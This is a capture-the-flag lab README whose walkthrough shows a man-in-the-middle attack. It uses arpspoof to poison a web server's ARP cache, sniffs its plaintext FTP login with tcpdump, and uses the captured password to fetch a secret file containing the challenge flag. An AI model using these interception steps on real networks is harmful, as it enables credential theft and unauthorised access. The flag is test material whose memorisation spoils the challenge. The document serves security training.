# Come This way

This challenge is about performing MITM attack on a webserver which fetches content from FTP server upon each HTTP request. 

After sniffing the FTP credentials, students can login and retrieve the secret file with a flag.

## How to solve
<details>
  <summary>Click to reveal how to solve steps</summary>

The entire workflow below can be followed from a **single hackerlab terminal** by using tmux panes for the long-running tools (`arpspoof` and `tcpdump`).

1. **Recon the targets**
```bash
root@hackerlab:~# nmap 172.20.0.71
...
80/tcp open  http

root@hackerlab:~# nmap 172.20.0.72
...
21/tcp open  ftp
```
   Now we know the client exposes HTTP and the backend exposes FTP.

2. **Check the HTTP output**
```bash
root@hackerlab:~# curl -v 172.20.0.71
*   Trying 172.20.0.71:80...
* Connected to 172.20.0.71 (172.20.0.71) port 80
> GET / HTTP/1.1
> Host: 172.20.0.71
> User-Agent: curl/8.5.0
> Accept: */*
> 
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Server: BaseHTTP/0.6 Python/3.14.0
< Date: Mon, 03 Nov 2025 21:08:29 GMT
< Content-type: text/plain
< 
Pier 7 Visitor Board – Daily Checklist
--------------------------------------
Morning tide smells like salt and diesel again, but everything is running smoothly:
 - Ferry beacons recalibrated at 06:15, blinking true north.
 - Café freezer defrost cycle finished; remind Nina to restock pastries.
 - Welcome sign still points down the service alley. Fix before tourists wander into the workshop.
 - Maintenance crew owes Luka a thank-you for rewiring the dock lights in the storm.

If you find anything out of place, leave a note in the harbor office log before sundown.
```

Nothing really interesting in the response. But the challenge description says that the HTTP server is using `172.20.0.72` as a datasource. 
Since `172.20.0.71` has only FTP port (21) opened, then probably the HTTP server reads the returned data from the FTP server.

We can try to pull MITM attack and sniff the FTP credentials.

3. **Prepare MITM tooling inside one tmux session**
```bash
# install dsniff so we can later use arpspoof
root@hackerlab:~# apt update && apt install -y dsniff
root@hackerlab:~# tmux new -s mitm
```
Inside tmux:
* press `Ctrl-b %` to split the window vertically (left pane for `arpspoof`, right pane for `tcpdump`).
* press `Ctrl-b "` (double quote) while the right pane is focused to create a small bottom pane for ad-hoc commands like `curl` and `ftp`.
* Now you can switch focus between panels using `Ctrl-b <arrow>`

4. **Start the ARP spoof in the left pane**
```bash
root@hackerlab:~# arpspoof -i eth0 -t 172.20.0.71 172.20.0.72
```
   This convinces the HTTP client (172.20.0.71) to route FTP packets (originally for 172.20.0.72) through us.

5. **Capture FTP credentials in the top-right pane**
```bash
root@hackerlab:~# tcpdump -A -i eth0 port 21 2>&1  | tee output
```
Using `tee` keeps the capture on screen and writes it to `tcpdump.output` for later inspection.

6. **Trigger the HTTP fetch from the bottom-right pane**
```bash
root@hackerlab:~# curl -v 172.20.0.71
root@hackerlab:~# cat tcpdump.output
...
20:50:10.007595 IP ... FTP: USER pepitto
20:50:10.007862 IP ... FTP: PASS Hard2GuessP@ssw0rd!
```
If you do not immediately see credentials, keep the long-running panes open and retry `curl`. Once the creds appear, stop `arpspoof`/`tcpdump` with `Ctrl-C` in their panes.

7. **Log in to FTP with the recovered credentials**
```bash
root@hackerlab:~# ftp 172.20.0.72
Name (172.20.0.72:root): pepitto
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||14589|)
150 Here comes the directory listing.
drwxr-xr-x    1 1001     1001         4096 Nov 03 20:55 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||46942|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           69 Nov 03 20:53 secret.txt
-rw-r--r--    1 1001     1001           58 Nov 03 20:53 content.txt
226 Directory send OK.
ftp> get secret.txt
ftp> bye
root@hackerlab:~# cat secret.txt
BSY{cO3G1COwygIapKOVVbR7AEWZ7kDRfaXy0GIEq2Ojr9lXoxnhIQ9IxlJk8ViO3Pws}
```

</details>

## Testing

The script [auto-solve.sh](./auto-solve.sh) automatically verifies that the challenge can be solved.
